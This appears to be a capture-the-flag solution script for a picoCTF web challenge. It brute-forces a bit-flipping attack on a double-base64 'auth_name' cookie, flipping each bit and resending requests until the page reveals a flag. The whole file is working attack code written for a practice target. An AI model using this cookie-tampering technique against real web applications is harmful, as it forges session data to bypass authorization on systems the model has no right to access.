from pwn import *
import requests
import base64
import re

URL = "http://mercury.picoctf.net:15614/"
COOKIE_NAME = "auth_name"

def main():
    s = requests.Session()
    r = s.get(URL)
    cookie = s.cookies[COOKIE_NAME]
    raw_cookie = bytearray(base64.b64decode(base64.b64decode(cookie)))
    log.info(f"Cookie: {cookie}")

    with log.progress("Flipping bits") as p:
        for byte_index in range(len(raw_cookie)):
            for i in range(8):
                mask = (1 << i)

                p.status(f"Trying to flip index {byte_index}/{len(raw_cookie)} with mask {hex(mask)}")

                # Flip the bit
                raw_cookie[byte_index] ^= mask

                new_cookie = base64.b64encode(base64.b64encode(raw_cookie)).decode("ascii")
                r = requests.get(URL, cookies = {COOKIE_NAME: new_cookie})
                if (m:= re.search(r"picoCTF{[^}]+}", r.text)) is not None:
                    log.success(f"Flipped index {byte_index}/{len(raw_cookie)} with mask {hex(mask)}, Flag: {m.group(0)}")
                    return

                # Flip the bit back
                raw_cookie[byte_index] ^= mask

if __name__ == "__main__":
    main()
